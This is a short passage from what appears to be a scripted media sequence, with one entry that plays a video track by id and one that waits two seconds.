     { type:"video", track:"video_1", id:"6abd374d673e2b44981dc239" },
     { type:"wait", ms:2000 },
